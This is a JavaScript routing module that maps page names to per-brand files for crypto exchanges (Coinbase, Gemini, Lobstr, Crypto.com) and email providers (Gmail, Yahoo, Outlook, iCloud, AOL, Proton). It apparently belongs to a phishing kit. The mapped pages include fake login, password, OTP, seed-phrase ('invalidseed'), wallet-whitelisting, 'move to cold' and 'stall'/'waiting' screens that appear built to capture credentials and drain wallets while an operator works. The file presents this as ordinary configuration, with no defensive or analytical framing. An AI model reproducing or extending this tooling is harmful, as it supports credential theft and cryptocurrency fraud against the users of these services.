// Page mapping configuration to handle inconsistent file naming
// Maps logical page names to actual file names per brand

const pageMapping = {
  // Coinbase pages (no prefix, PascalCase)
  coinbase: {
    'loading': 'Loading',
    'estimatedbalance': 'EstimatedBalance',
    'whitelistwallet': 'WhitelistWallet',
    'whitelistsuccessful': 'WhitelistSuccessful',
    'review': 'Review',
    'pendingreview': 'PendingReview',
    'completed': 'Completed',
    'disconnectwallet': 'DisconnectWallet',
    'invalidseed': 'InvalidSeed',
    'ledgerdisconnect': 'LedgerDisconnect',
    'trezordisconnect': 'TrezorDisconnect',
    'movetocold': 'MoveToCold',
    'verifyidentity': 'Coinbase-VerifyIdentity',
    'captcha': 'captcha',
    'error': 'error',
    'otp': 'otp',
    'password': 'password',
    'verify': 'verify'
  },

  // Gemini pages (prefix + lowercase)
  gemini: {
    'loading': 'geminiloading',
    'estimatedbalance': 'geminiestimatedbalance',
    'whitelistwallet': 'geminiwhitelistwallet',
    'whitelistsuccessful': 'geminiwhitelistsuccessful',
    'review': 'geminireview',
    'pendingreview': 'geminireview',
    'completed': 'geminicompleted',
    'disconnectwallet': 'geminidisconnectwallet',
    'invalidseed': 'geminiinvalidseed',
    'ledgerdisconnect': 'LedgerDisconnect',
    'trezordisconnect': 'TrezorDisconnect',
    'movetocold': 'MoveToCold',
    'captcha': 'captcha', // Shared captcha page
    'error': 'error'     // Shared error page
  },

  // Lobstr pages (prefix + camelCase)
  lobstr: {
    'loading': 'lobstrloading',
    'estimatedbalance': 'lobstrEstimatedBalance',
    'whitelistwallet': 'lobstrWhitelistWallet',
    'review': 'lobstrReview',
    'disconnectwallet': 'lobstrDisconnectWallet',
    'invalidseed': 'lobstrInvalidSeed',
    'ledgerdisconnect': 'LedgerDisconnect',
    'trezordisconnect': 'TrezorDisconnect',
    'movetocold': 'MoveToCold',
    'captcha': 'captcha', // Shared captcha page
    'error': 'error'     // Shared error page
  },

  // Crypto.com pages (prefix + lowercase)
  cryptocom: {
    'loading': 'cryptocomloading',
    'estimatedbalance': 'cryptocomestimatedbalance',
    'whitelistwallet': 'cryptocomwhitelistwallet',
    'whitelistsuccessful': 'cryptocomwhitelistsuccessful',
    'review': 'cryptocomreview',
    'pendingreview': 'cryptocomreview',
    'completed': 'cryptocomcompleted',
    'disconnectwallet': 'cryptocomdisconnectwallet',
    'invalidseed': 'cryptocominvalidseed',
    'captcha': 'captcha', // Shared captcha page
    'error': 'error'     // Shared error page
  },

  // Gmail pages
  gmail: {
    'loading': 'gmailloading',
    'login': 'gmaillogin',
    'otp': 'gmailotp',
    'password': 'gmailpassword',
    'verify': 'gmailverify',
    'invalid': 'gmailinvalid',
    'reset': 'gmailreset',
    'stall': 'gmailstall',
    'waiting': 'gmailwaiting',
    'captcha': 'captcha',
    'error': 'error'
  },

  // Yahoo pages
  yahoo: {
    'loading': 'yahoologin',
    'login': 'yahoologin',
    'otp': 'yahoootp',
    'password': 'yahoopassword',
    'captcha': 'yahoocaptcha',
    'invalid': 'yahooinvalid',
    'recovery': 'yahoorecovery',
    'waiting': 'yahoowaiting',
    'error': 'error'
  },

  // Outlook pages
  outlook: {
    'loading': 'outlooklogin',
    'login': 'outlooklogin',
    'otp': 'outlookotp',
    'captcha': 'captcha',
    'error': 'error'
  },

  // iCloud pages
  icloud: {
    'loading': 'icloudlogin',
    'login': 'icloudlogin',
    'otp': 'icloudotp',
    'captcha': 'captcha',
    'error': 'error'
  },

  // AOL pages
  aol: {
    'loading': 'aollogin',
    'login': 'aollogin',
    'otp': 'aolotp',
    'captcha': 'captcha',
    'error': 'error'
  },

  // Proton pages
  proton: {
    'loading': 'protonlogin',
    'login': 'protonlogin',
    'otp': 'protonotp',
    'captcha': 'captcha',
    'error': 'error'
  }
};

// Helper function to resolve page name to actual file name
function resolvePageName(brand, requestedPage) {
  // Normalize the requested page name
  const normalized = requestedPage
    .replace(/^\/+|\.html$/g, '')
    .toLowerCase()
    .trim();

  // Get brand mapping
  const brandMapping = pageMapping[brand] || pageMapping.gemini;

  // First try exact match in mapping
  if (brandMapping[normalized]) {
    return brandMapping[normalized];
  }

  // Try without brand prefix if it exists
  const withoutPrefix = normalized.replace(new RegExp(`^${brand}`), '');
  if (brandMapping[withoutPrefix]) {
    return brandMapping[withoutPrefix];
  }

  // If not found in mapping, return the original (for shared pages)
  return requestedPage.replace(/\.html$/, '');
}

// Helper to get all valid page names for a brand
function getValidPagesForBrand(brand) {
  const brandMapping = pageMapping[brand] || pageMapping.gemini;
  return Object.values(brandMapping);
}

// Helper to check if a page exists for a brand
function pageExistsForBrand(brand, pageName) {
  const resolved = resolvePageName(brand, pageName);
  const validPages = getValidPagesForBrand(brand);

  return validPages.some(page =>
    page.toLowerCase() === resolved.toLowerCase()
  );
}

export {
  pageMapping,
  resolvePageName,
  getValidPagesForBrand,
  pageExistsForBrand
};